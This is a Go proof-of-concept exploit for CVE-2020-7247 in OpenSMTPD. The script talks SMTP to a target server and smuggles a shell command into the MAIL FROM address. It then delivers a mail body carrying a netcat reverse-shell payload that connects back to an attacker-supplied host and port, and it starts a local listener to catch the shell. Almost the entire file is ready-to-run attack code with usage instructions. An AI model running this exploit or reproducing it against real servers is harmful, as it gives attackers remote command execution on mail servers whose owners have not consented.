// Proof Of Concept - CVE-2020-7247
// OpenSMTPD < 6.6.2 
// https://www.cvedetails.com/cve/CVE-2020-7247
// tested on: OpenBSD 6.6
// author: Roland Heimpoldinger
// @r0labsecurity
// ---
// credits to Marco Ivaldi <raptor@0xdeadbeef.info> for payload
// ---
// Usage
// (remote) $ go run CVE-2020-7247.go -u 192.168.0.2 -p 25 -d example.org

package main

import (
	"log"
	"net"
	"os"
	"flag"
	"fmt"
	"strconv"
	"bufio"
	"strings"
	"os/exec"
)



func main() {
	urlPtr := flag.String("u", "", "URL to OpenSMTPD-server (required)")
	portPtr := flag.Int("p", 25, "Port")
	domainPtr := flag.String("d", "localhost", "Domain, e.g. example.org")
	lhostPtr := flag.String("lh", "", "LHOST for reverse shell (your ip)")
	lportPtr := flag.String("lp", "", "LPORT for reverse shell (free port > 1024)")

	flag.Parse()

	if *urlPtr == "" || *lhostPtr == "" || *lportPtr == "" {
		flag.PrintDefaults()
		os.Exit(1)
	} else {
		hostname := net.ParseIP(*urlPtr)
		if hostname == nil {
			_, err := net.LookupHost(*urlPtr)
			if err != nil {
				log.Fatalln("[!] can not lookup hostname '%s'\n", *urlPtr)
			}
		}
	}

	if *portPtr > 65534 || *portPtr < 1 {
		log.Fatalln("[!] check your port\n")
	}

	fmt.Printf(`
// Proof Of Concept - CVE-2020-7247
// OpenSMTPD < 6.6.2 
// https://www.cvedetails.com/cve/CVE-2020-7247
// tested on: OpenBSD 6.6
// author: Roland Heimpoldinger
// @r0labsecurity
// ---
// credits to Marco Ivaldi <raptor@0xdeadbeef.info> for payload
// ---
// Usage
// (remote) $ go run CVE-2020-7247.go -u 192.168.0.2 -p 25 -d example.org
`)

	fmt.Printf("\n[*] Connecting...\n")

	target := *urlPtr + ":" + strconv.Itoa(*portPtr)

	conn, err := net.Dial("tcp", target)

	if err != nil {
		log.Fatalln("[!] can not connect to server: ", err)
	}

	banner, _ := bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(banner, "OpenSMTPD") != true {
		log.Fatalln("[!] does not look like an OpenSMTPD server.")
	} else {
		fmt.Printf("[+] OpenSMTPD server detected.\n")
	}

	fmt.Fprintf(conn, "HELO world\r\n")

	response, _ := bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "250") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] server do not want meet us")
	} else {
		fmt.Printf("[+] HELO sent.\n")
	}

	fmt.Fprintf(conn, "MAIL FROM: <;for i in 0 1 2 3 4 5 6 7 8 9 a b c d;do read r;done;sh;exit 0;>\r\n")

	response, _ = bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "250") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] can not send payload.")
	} else {
		fmt.Printf("[+] Payload sent.\n")
	}

	recpt := ""
	if *domainPtr == "localhost" || *domainPtr == "127.0.0.1" {
		recpt = "<root>"
	} else {
		recpt = "<root@" + *domainPtr + ">"
	}
	fmt.Fprintf(conn, "RCPT TO: %s\r\n", recpt)

	response, _ = bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "250") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] error with recipient.")
	} else {
		fmt.Printf("[+] RCPT TO sent.\n")
	}

	fmt.Fprintf(conn, "DATA\r\n")

	response, _ = bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "354") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] server do not want your data.")
	}

	payload := "sleep 2; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + *lhostPtr + " " + *lportPtr + " >/tmp/f"
	fmt.Fprintf(conn, "\r\n#0\n#1\n#2\n#3\n#4\n#5\n#6\n#7\n#8\n#9\n#a\n#b\n#c\n#d\n%s\r\n.\r\n", payload)

	response, _ = bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "250") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] can not send message.")
	} else {
		fmt.Printf("[+] mail body sent.\n")
	}

	fmt.Fprintf(conn, "QUIT\r\n")

	response, _ = bufio.NewReader(conn).ReadString('\n')
	if strings.Contains(response, "221") != true {
		fmt.Printf("response: %s\n", response)
		log.Fatalln("[!] server did not say 'Bye'. sad....")
	} else {
		fmt.Printf("[+] finished.\n")
	}

	fmt.Printf("[*] Waiting for shell...\n")

	// on linux host use this
	cmd := exec.Command("nc", "-lnvp", *lportPtr)
	// on openbsd host use this
	// cmd := exec.Comand("nc", "-lnv", *lportPtr)

	cmd.Stdout = os.Stdout
	cmd.Stdin = os.Stdin
	//cmd.Stderr = os.Stderr
	err = cmd.Run()
	if err != nil {
		log.Fatalln("[!] error: ", err)
	}
}
